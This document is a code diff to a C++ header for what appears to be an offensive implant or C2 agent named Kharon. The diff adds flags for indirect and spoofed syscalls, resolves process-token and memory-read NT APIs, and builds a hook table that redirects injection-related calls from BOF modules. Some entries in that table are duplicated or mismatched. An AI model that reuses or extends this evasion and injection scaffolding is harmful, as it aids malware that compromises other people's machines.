@@ -200,6 +200,10 @@ class Socket;
 #define x64_OPCODE_MOV			0xB8
 #define	x64_SYSCALL_STUB_SIZE   0x20
 
+#define SYSCALL_FLAGS Self->KH_SYSCALL_FLAGS
+#define SYSCALL_INDIRECT 0x100
+#define SYSCALL_SPOOF    0x250
+
 #define G_KHARON Root::Kharon* Self = (Root::Kharon*)NtCurrentPeb()->TelemetryCoverageHeader;
 
 typedef struct {
@@ -251,6 +255,8 @@ namespace Root {
         Parser*    Psr;
         Package*   Pkg;
     
+        UINT8 KH_SYSCALL_FLAGS;
+
         struct {
             ULONG AllocGran;
             ULONG PageSize;
@@ -603,12 +609,16 @@ namespace Root {
             DECLAPI( NtWriteVirtualMemory );
             DECLAPI( NtFreeVirtualMemory );
             DECLAPI( NtProtectVirtualMemory );
+            DECLAPI( NtReadVirtualMemory );
             DECLAPI( NtCreateSection );
             DECLAPI( NtMapViewOfSection );
 
             DECLAPI( khRtlFillMemory );
 
             DECLAPI( LdrGetProcedureAddress );
+
+            DECLAPI( NtOpenThreadTokenEx );
+            DECLAPI( NtOpenProcessTokenEx );
     
             DECLAPI( NtOpenProcess );
             DECLAPI( NtCreateThreadEx ); 
@@ -673,6 +683,7 @@ namespace Root {
             RSL_TYPE( NtWriteVirtualMemory ),
             RSL_TYPE( NtFreeVirtualMemory ),
             RSL_TYPE( NtProtectVirtualMemory ),
+            RSL_TYPE( NtReadVirtualMemory ),
             RSL_TYPE( NtCreateSection ),
             RSL_TYPE( NtMapViewOfSection ),
 
@@ -680,6 +691,9 @@ namespace Root {
 
             RSL_TYPE( LdrGetProcedureAddress ),
     
+            RSL_TYPE( NtOpenThreadTokenEx ),
+            RSL_TYPE( NtOpenProcessTokenEx ),
+
             RSL_TYPE( NtOpenProcess ),
             RSL_TYPE( NtCreateThreadEx ),
             RSL_TYPE( NtOpenThread ),
@@ -748,6 +762,16 @@ namespace Root {
             DECLAPI( ShowWindow );
         } User32 = {
             RSL_TYPE( ShowWindow ),
+        };
+
+        struct {
+            HANDLE Handle;
+
+            DECLAPI( CoInitialize );
+            DECLAPI( CoInitializeEx );
+        } Ole32 = {
+            RSL_TYPE( CoInitialize ),
+            RSL_TYPE( CoInitializeEx ),
         };
 
         struct {
@@ -1096,23 +1120,33 @@ public:
 
     PPACKAGE Pkg = { 0 };
 
-    BOOL Hook = KH_BOF_HOOK_ENALED;
+    BOOL HookEnabled = KH_BOF_HOOK_ENALED;
 
     VALUE_DICT* UserData  = nullptr;
-    BOF_OBJ*   Node      = nullptr;
-    ULONG      ObjCount  = 0;
+    BOF_OBJ*    Node      = nullptr;
+    ULONG       ObjCount  = 0;
 
-    // todo hooks
-    // struct {
-    //     UPTR Hash;
-    //     UPTR Ptr;
-    // } HookTable[10] = {
-    //     HookTable[0] = { Hsh::Str( "VirtualAlloc" ),       (UPTR)&Self->Mm->Alloc },
-    //     HookTable[1] = { Hsh::Str( "VirtualProtect" ),     (UPTR)&Self->Mm->Protect },
-    //     HookTable[2] = { Hsh::Str( "WriteProcessMemory" ), (UPTR)&Self->Mm->Write },
-    //     HookTable[3] = { Hsh::Str( "ReadProcessMemory" ),  (UPTR)&Self->Mm->Read },
-    //     HookTable[4] = { Hsh::Str( "LoadLibraryA" ),       (UPTR)&Self->Lib->Load },
-    // };
+    // hooks call from bof table
+    struct {
+        UPTR Hash;
+        UPTR Ptr;
+    } HookTable[15] = {
+        HookTable[0]  = { Hsh::Str( "VirtualAlloc" ),       (UPTR)&Self->Cf->VirtualAlloc },
+        HookTable[1]  = { Hsh::Str( "VirtualProtect" ),     (UPTR)&Self->Cf->VirtualAllocEx },
+        HookTable[2]  = { Hsh::Str( "WriteProcessMemory" ), (UPTR)&Self->Cf->WriteProcessMemory },
+        HookTable[3]  = { Hsh::Str( "ReadProcessMemory" ),  (UPTR)&Self->Cf->ReadProcessMemory },
+        HookTable[4]  = { Hsh::Str( "LoadLibraryA" ),       (UPTR)&Self->Cf->LoadLibraryA },
+        HookTable[5]  = { Hsh::Str( "VirtualProtect" ),     (UPTR)&Self->Cf->VirtualProtect },
+        HookTable[6]  = { Hsh::Str( "VirtualProtectEx" ),   (UPTR)&Self->Cf->VirtualProtectEx },
+        HookTable[7]  = { Hsh::Str( "VirtualProtectEx" ),   (UPTR)&Self->Cf->VirtualProtectEx },
+        HookTable[8]  = { Hsh::Str( "NtSetContextThread" ), (UPTR)&Self->Cf->SetThreadContext },
+        HookTable[9]  = { Hsh::Str( "SetThreadContext" ),   (UPTR)&Self->Cf->SetThreadContext },
+        HookTable[10] = { Hsh::Str( "MtGetContextThread" ), (UPTR)&Self->Cf->GetThreadContext },
+        HookTable[11] = { Hsh::Str( "GetThreadContext" ),   (UPTR)&Self->Cf->GetThreadContext },
+        HookTable[12] = { Hsh::Str( "CLRCreateInstance" ),  (UPTR)&Self->Cf->CLRCreateInstance },
+        HookTable[13] = { Hsh::Str( "CoInitialize" ),       (UPTR)&Self->Cf->CoInitialize },
+        HookTable[14] = { Hsh::Str( "CoInitializeEx" ),     (UPTR)&Self->Cf->CoInitializeEx },
+    };
 
     struct {
         UPTR  Hash;
@@ -1316,8 +1350,24 @@ public:
         INT  len
     ) -> VOID;
 
+    static auto ReadProcessMemory(
+        HANDLE hProcess, 
+        PVOID  BaseAddress, 
+        PVOID  Buffer, 
+        SIZE_T Size, 
+        SIZE_T *Read
+    ) -> BOOL;
+
+    static auto WriteProcessMemory(
+        HANDLE  hProcess, 
+        PVOID   BaseAddress, 
+        PVOID   Buffer, 
+        SIZE_T  Size, 
+        SIZE_T* Written
+    ) -> BOOL;
+
     static auto VirtualAlloc(
-        LPVOID Address, 
+        PVOID  Address, 
         SIZE_T Size, 
         DWORD  AllocType, 
         DWORD  Protect
@@ -1370,14 +1420,23 @@ public:
         const IID &clsid, const IID &riid, LPVOID *ppInterface
     ) -> HRESULT;
 
+    static auto CoInitialize(
+        LPVOID pvReserved
+    ) -> HRESULT;
+
+    static auto CoInitializeEx(
+        LPVOID pvReserved,
+        DWORD  dwCoInit
+    ) -> HRESULT;    
+
     static auto GetThreadContext(
-        HANDLE  Handle,
-        CONTEXT Ctx
+        HANDLE   Handle,
+        CONTEXT* Ctx
     ) -> BOOL;
 
     static auto SetThreadContext(
-        HANDLE  Handle,
-        CONTEXT Ctx
+        HANDLE   Handle,
+        CONTEXT* Ctx
     ) -> BOOL; 
 };
 
@@ -2211,13 +2270,13 @@ public:
     Thread( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
     auto Thread::GetCtx(
-        HANDLE  Handle,
-        CONTEXT Ctx
+        HANDLE   Handle,
+        CONTEXT* Ctx
     ) -> BOOL;
 
     auto Thread::SetCtx(
-        HANDLE  Handle,
-        CONTEXT Ctx
+        HANDLE   Handle,
+        CONTEXT* Ctx
     ) -> BOOL;
 
     auto Create(
@@ -2273,7 +2332,7 @@ private:
 public:
     Library( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-    auto static Load(
+    auto Load(
         _In_ PCHAR LibName
     ) -> UPTR;
 
@@ -2384,37 +2443,37 @@ private:
 public:
     Memory( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-    auto static Alloc(
-        _In_ PVOID Base,
-        _In_ ULONG Size,
-        _In_ ULONG AllocType,
-        _In_ ULONG Protect,
+    auto Alloc(
+        _In_ PVOID  Base,
+        _In_ SIZE_T Size,
+        _In_ ULONG  AllocType,
+        _In_ ULONG  Protect,
         _In_ HANDLE Handle = nullptr
     ) -> PVOID;
 
-    auto static Protect(
+    auto Protect(
         _In_  PVOID  Base,
-        _In_  ULONG  Size,
+        _In_  SIZE_T Size,
         _In_  ULONG  NewProt,
-        _Out_ ULONG* OldProt,
-        _In_ HANDLE Handle = nullptr
+        _Out_ ULONG *OldProt,
+        _In_  HANDLE Handle = nullptr
     ) -> BOOL;
 
-    auto static Write(
+    auto Write(
         _In_ PVOID  Base,
         _In_ BYTE*  Buffer,
         _In_ ULONG  Size,
         _In_ HANDLE Handle = nullptr
     ) -> BOOL;
 
-    auto static WriteAPC(
+    auto WriteAPC(
         _In_ HANDLE Handle,
         _In_ PVOID  Base,
         _In_ BYTE*  Buffer,
         _In_ ULONG  Size
     ) -> BOOL;
 
-    auto static Read(
+    auto Read(
         _In_  PVOID   Base,
         _In_  BYTE*   Buffer,
         _In_  SIZE_T  Size,
@@ -2422,14 +2481,14 @@ public:
         _In_ HANDLE Handle = nullptr
     ) -> BOOL;
 
-    auto static Free(
+    auto Free(
         _In_ PVOID  Base,
-        _In_ ULONG  Size,
+        _In_ SIZE_T Size,
         _In_ ULONG  FreeType,
         _In_ HANDLE Handle = nullptr
     ) -> BOOL;
 
-    auto static MapView(
+    auto MapView(
         _In_        HANDLE          SectionHandle,
         _In_        HANDLE          ProcessHandle,
         _Inout_     PVOID          *BaseAddress,
@@ -2442,7 +2501,7 @@ public:
         _In_        ULONG           PageProtection
     ) -> LONG;
 
-    auto static CreateSection(
+    auto CreateSection(
         _Out_    HANDLE*            SectionHandle,
         _In_     ACCESS_MASK        DesiredAccess,
         _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
